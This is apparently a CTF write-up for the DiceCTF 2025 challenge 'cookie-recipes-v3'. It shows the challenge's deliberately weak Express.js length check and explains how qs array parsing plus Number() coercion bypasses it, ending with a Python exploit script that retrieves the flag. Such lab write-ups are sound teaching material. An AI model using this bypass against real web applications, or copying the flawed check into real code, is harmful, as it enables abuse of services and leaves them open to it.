---
title: "Dice25: Writeup for web/cookie-recipes-v3"
date: 2025-04-12T12:18:04+01:00
tags: ["ctf", "write-up", "dice"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Cookie Recipes V3"
summary: "Bypass ExpressJS length check using `number[]=value`; `qs` parses array, coerced to pass validation."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

- **CTF**: Dice CTF 2025
- **Challenge**: cookie-recipes-v3
- **Category**: Web Exploitation
- **Points**: 105 (459 solves)
- **Description**: Mmmmmmm...
- **Source code**: [index.js](https://static.dicega.ng/uploads/58daa3f015c7a217f9c0e9973ce30d8d3a579e127ed6900ff88893a88a7c5316/index.js)

## TL;DR

In the **cookie-recipes-v3** challenge, ExpressJS's use of the `qs` library for query string parsing allows bypassing a length check on the `number` parameter. By sending a query like `number[]=1000000000`, which `qs` parses into an array, we exploit JavaScript's type coercion and array behavior to pass the check. The exploit manipulates the `Number()` function’s implicit conversion to retrieve the flag.

## Initial Analysis

At first glance, the challenge presents itself as a simple cookie counter application. Three buttons to bake cookies in different amounts, a disabled button for a larger batch, and one final button to deliver cookies.

![website](/blog/images/2025-04-12-12-22-02.png)

The UI is minimal, but the disabling of `Super cookie recipe (makes a million)` button screamed a hint for me. Let's check the source code:

```javascript
const express = require('express')

const app = express()

const cookies = new Map()

app.use((req, res, next) => {
    const cookies = req.headers.cookie
    const user = cookies?.split('=')?.[1]

    if (user) { req.user = user }
    else {
        const id = Math.random().toString(36).slice(2)
        res.setHeader('set-cookie', `user=${id}`)
        req.user = id
    }

    next()
})

app.get('/', (req, res) => {
    const count = cookies.get(req.user) ?? 0
    res.type('html').send(`
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css">
        <link rel="stylesheet" href="https://fonts.xz.style/serve/inter.css">
        <div>You have <span>${count}</span> cookies</div>
        <button id="basic">Basic cookie recipe (makes one)</button>
        <br>
        <button id="advanced">Advanced cookie recipe (makes a dozen)</button>
        <br>
        <button disabled>Super cookie recipe (makes a million)</button>
        <br>
        <button id="deliver">Deliver cookies</button>
        <script src="/script.js"></script>
    `)
})

app.get('/script.js', (_req, res) => {
    res.type('js').send(`
        const basic = document.querySelector('#basic')
        const advanced = document.querySelector('#advanced')
        const deliver = document.querySelector('#deliver')

        const showCookies = (number) => {
            const span = document.querySelector('span')
            span.textContent = number
        }

        basic.addEventListener('click', async () => {
            const res = await fetch('/bake?number=1', { method: 'POST' })
            const number = await res.text()
            showCookies(+number)
        })

        advanced.addEventListener('click', async () => {
            const res = await fetch('/bake?number=12', { method: 'POST' })
            const number = await res.text()
            showCookies(+number)
        })


        deliver.addEventListener('click', async () => {
            const res = await fetch('/deliver', { method: 'POST' })
            const text = await res.text()
            alert(text)
        })
    `)
})

app.post('/bake', (req, res) => {
    const number = req.query.number
    if (!number) {
        res.end('missing number')
    } else if (number.length <= 2) {
        cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))
        res.end(cookies.get(req.user).toString())
    } else {
        res.end('that is too many cookies')
    }
})

app.post('/deliver', (req, res) => {
    const current = cookies.get(req.user) ?? 0
    const target = 1_000_000_000
    if (current < target) {
        res.end(`not enough (need ${target - current}) more`)
    } else {
        res.end(process.env.FLAG)
    }
})

app.listen(3000)
```

The backend is a small Express.js app with no authentication or database — just an in-memory `Map` to store cookie counts per user. Each visitor gets a `user` cookie set via middleware if it doesn’t already exist, and this ID is used as the key to track how many cookies they’ve baked.

There are two main endpoints that matter here:

- `POST /bake`: accepts a `number` parameter in the query string, increments the user’s cookie count accordingly — but only if `number.length <= 2`.
- `POST /deliver`: checks if the user has reached **one billion** cookies. If so, it returns the flag; otherwise, it just tells you how many more you need.

How do I know they matter? Well, because one serves the flag, and the other allows user input to be passed.

Looking closer, The server doesn’t validate the type of `number`, only its **length**. That might seem restrictive, so let's check [express](https://expressjs.com/en/5x/api) docs for more info.

![qs-expressjs-docs](/blog/images/2025-04-12-12-22-31.png)

Something in red, yay! Let’s take a closer look at how `req.query.number` is actually interpreted.

## Task Analysis

Admittedly, I took the hardest route when solving the challenge on remote, and when I tried to solve it locally, it didn't work xD.

Only after some time did I realize what was wrong: ExpressJS version 5.x mitigates the vulnerability (or feature?) I'm about to discuss. I found another (simpler and more effective) solution [here](https://github.com/PwnOfPower/DiceCTF_Quals_2025/tree/main/web/cookie-recipes-v3)

{{< notice tip >}}
Tip: The solution above works because NaN compared to any numeric value returns false.
{{< /notice >}}

Let's now proceed with my solution, elegant and highlights my overthinking nature LOL.

![overthinking-meme](/blog/images/2025-04-12-12-24-34.png)

---

We focus on this code block:

```javascript
if (number.length <= 2) {
    cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))
    res.end(cookies.get(req.user).toString())
}
```

The check only limits the `.length` of `number`. Suspecting Express uses the `qs` module for query parsing `(req.query)`,
we can test that by creating our own ExpressJS environnment, parse a query string using both express and qs and compare the results.

1. Set up the environnment:

```bash
npm init -y
npm install express@4.15.0
```

2. Set a simple web server to test the hypotheses:

```javascript
const express = require('express');
const qs = require('qs');
const app = express();

app.get('/', (req, res) => {
    const queryExpress = req.query; // the parsed req.query from expressjs
    const queryQS = qs.parse('a[]=b');  // the parsed req.query from qs

    console.log(queryQS)
    console.log(queryExpress);
    res.end();
});

app.listen(3000, () => {
    console.log(`Server listening at http://localhost:3000`);
});
```

3. Test our hypotheses:

```bash
curl "http://localhost:3000/?a[]=b"
```

Gives:

```bash
web/cookie-recipes-v3/playground via  v20.19.0
➜ node index.js
Server listening at http://localhost:3000
{ a: [ 'b' ] }
{ a: [ 'b' ] }
```

Great! express uses the `qs` module to parse query strings, not Node's default querystring.
Let's check [qs](https://github.com/ljharb/qs?tab=readme-ov-file#parsing-arrays) documentation to see what we can do with this.

---

It turns out that `qs` supports parsing of nested objects, arrays, and more. For example:

```text
a[]=b
```

gets parsed into:

```js
{ a: ["b"] }
```

So how does this help in our challenge?

If we revisit the original code:

```javascript
if (number.length <= 2) {
    cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))
    res.end(cookies.get(req.user).toString())
}
```

We can see that the check is on `number.length <= 2`. If `number` is a string like `"100"`, the check fails (`length = 3`). But if we send `number[]=` in the query string, Express (via `qs`) parses that into an array. Arrays in JavaScript have a `.length` property, and we can ensure that property is `<= 2` by only providing one or two elements — like `number[]=1000000000`.

So, even though the check is still in place, we bypass it by controlling the input type — an array instead of a string. Now we just need to understand how JavaScript handles `Number(array)`.

---

You could experiment with different inputs to find the answer quickly, but let’s take a deeper dive into JavaScript's internal workings, specifically focusing on its implicit type conversion feature.

> You can skip this section and move straight to the exploitation if you're already familiar with the details of type conversion.

---

When the `Number()` function is called, it converts its argument into a number following these steps:

1. If the argument is already a `Number`, it simply returns that number.
2. If the argument is a `String`, it converts the string to a number (via `StringToNumber()`).
3. If the argument is an **object** (which is the case for arrays in JavaScript), it calls the `ToPrimitive()` function.

`ToPrimitive()` is invoked implicitly when we pass an object, and what does it do?

As the name suggests, this function converts an object to a primitive value (either a string or a number), and it does so by calling `OrdinaryToPrimitive`. This function takes the object and a preferred type (by default, `number`).

`OrdinaryToPrimitive` proceeds as follows:

1. It first calls the object's `valueOf()` method, which, in the case of arrays, returns the array itself.
2. If that doesn't provide a suitable primitive, it then calls the object's `toString()` method, which returns the string representation of the array.

> `.valueOf()` returns the array itself because that's how JavaScript's `Array.prototype.valueOf()` is defined in the spec.

> You can read more about [Object.prototype.valueOf()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf) and [Object.prototype.toString()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString) to understand how they work.

So, what’s happening here? When an array is passed to `Number()`, it is first converted to a string (via `toString()`), and then that string is passed to `Number()`, which converts it to a number using `StringToNumber()`.

This process of implicit coercion explains how we can pass an array to `Number()` and still get the correct numeric result.

## Exploitation

Armed with this newfound knowledge, we know exactly what to do: we need to craft a payload that, when converted to a string, results in a number that won’t cause issues for the `Number()` function.

The payload will look like this:

```
number[]=1000000000 // This is the exact target value we need
```

Now, to submit this query string, we can create a simple Python script that will interact with the server and retrieve the flag:

```python
import requests

url = "https://cookie.dicec.tf"

s = requests.Session()

# Start a session to maintain cookies across requests
s.get(url)

# Send the payload to the /bake endpoint
s.post(url + "/bake", params={"number[]": "100000000000000"})

# Send a request to the /deliver endpoint to fetch the flag
res = s.post(url + "/deliver")
print(res.text)  # Print the flag
```

This script sends the payload to the server, which, after processing, returns the flag in the response.

```bash
/tmp via 🐍 v3.13.2 took 2s
➜ python exploit.py
dice{cookie_cookie_cookie}
```

Flag is: `dice{cookie_cookie_cookie}`

![celebration](/blog/images/2025-04-12-12-35-09.png)

## Conclusions

What we learned in this challenge:

1. **Type Coercion in JavaScript**: Understanding how JavaScript implicitly converts objects to primitives (e.g., arrays to strings) is crucial in exploiting type-based vulnerabilities.

2. **Query String Parsing**: Knowing how libraries like `qs` differ from default query parsing allows manipulation of input data to bypass security checks.

3. **Array Behavior**: Recognizing how arrays handle `.length` and conversion to string helps in crafting inputs that pass validation checks.

4. **Implicit Conversion**: Realizing the role of implicit functions like `ToPrimitive()` and `OrdinaryToPrimitive()` in type conversion clarifies the behavior of complex data types in JavaScript.

## References

If you're interested to learn more, here is a list of useful references:

1. **[Express.js API - req.body](https://expressjs.com/en/5x/api#req.body)**: Understanding how Express parses and handles request bodies is essential for analyzing how input is processed in the challenge.

2. **[qs - Query String Parsing Library](https://www.npmjs.com/package/qs)**: This explains how the `qs` library parses query strings, which is key to understanding the behavior of the vulnerable application in the challenge.

3. **[Query String (Wikipedia)](https://en.wikipedia.org/wiki/Query_string)**: Provides general background on how query strings work, which helps in understanding the significance of query parameters in the exploit.

4. **[JavaScript Equality Comparisons and Sameness (MDN)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Equality_comparisons_and_sameness)**: Details the behavior of equality operators, helping to understand how JavaScript compares values and objects in the challenge.

5. **[TC39 - ToPrimitive](https://tc39.es/ecma262/multipage/abstract-operations.html#sec-toprimitive)**: The official specification describing how JavaScript converts objects to primitive values, which is central to the implicit type conversion used in the exploit.

6. **[TC39 - ToNumber](https://tc39.es/ecma262/multipage/abstract-operations.html#sec-tonumber)**: The specification for converting values to numbers, explaining how JavaScript handles conversion when objects (like arrays) are passed to the `Number()` function.

7. **[qs - Parsing Arrays](https://github.com/ljharb/qs?tab=readme-ov-file#parsing-arrays)**: Offers insights into how the `qs` library parses arrays in query strings, which is essential for understanding how the exploit works when using arrays.

8. **[JavaScript Addition Operator (TC39)](https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-addition-operator-plus-runtime-semantics-evaluation)**: Describes how the addition operator works, particularly when involving coercion, which is part of the exploit when handling arrays and numbers.

9. **[Number Constructor (MDN)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number)**: Explains how the `Number()` function behaves, specifically when dealing with arrays and how they are converted into numbers.

